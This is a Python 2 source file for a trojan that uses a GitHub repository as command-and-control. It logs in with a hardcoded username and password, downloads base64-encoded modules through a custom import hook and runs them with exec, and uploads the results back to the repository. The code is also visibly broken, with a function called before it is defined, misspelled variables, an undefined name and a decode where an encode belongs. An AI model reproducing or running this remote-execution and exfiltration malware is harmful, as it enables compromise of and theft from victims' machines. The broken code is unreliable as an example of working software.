__author__ = 'DSU'
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import datetime
 
from github3 import login
ID = "Sample1"
CONFIG = "%s.json" % ID
PATH = "data/%s/" % ID
MODULES = []
QUEUE = Queue.Queue
connect()
 
def connect():
    gh = login(username="sdmike1", password="sdshlanta21")
    repo = gh.repository("najones19746", "example")
    branch = repo.branch("master")
    return gh, repo, branch

def get_content(filepath):
	gh,repo,branch = connect()
	tree = branch.commit.commit.tree.recurse()
	for filename in tree.tree:
		if filepath in filename:
			print '[*]Found File %s' %filepaht
			blob = repo.blob(filename.__json__data['sha'])
			return blob.content

	return None

def get_config():
	global CONFIGURED
	config_json = get_content(CONFIG)
	config = json.loads(base64.b64decode(config_json))
	CONFIGURED = True
	if task in config:
		if task['module'] not in sys.modules:
			exec('import %s' % task['module'])
	return config


def store(data):
	gh, repo, branch = connect()
	path = 'data /%s/%s.data' % (ID,datetime.now())
	repo.create_file(path,'Commit Message',base64.b64decode(data))
	return

def run(module):
	QUEUE.put(1)
	result = sys.modules[mbdule.run()]
	QUEUE.get()
	store(result)

	return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    def find_module(self, fullname, path=None):
 
        if CONFIGURED:
            print 'attempting to find %s' % fullname
            library = get_content("modules/%s" % fullname)
            if library is not None:
                self.current_module_code = base64.b64decode(library)
                return self
        return None
    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
 
        return module
 
 


def main():
	print '[*] Running...'

	sys.meta_path = [GitImporter()]

	while True:
		if QUEUE.empty():
			config = get_config()
			for task in config:
				t = threading.Thread(target=run, args=(task['module'],))
				t.start()
				time.sleep(random.randint(1,10))

if __name__ == '__main__':
	main()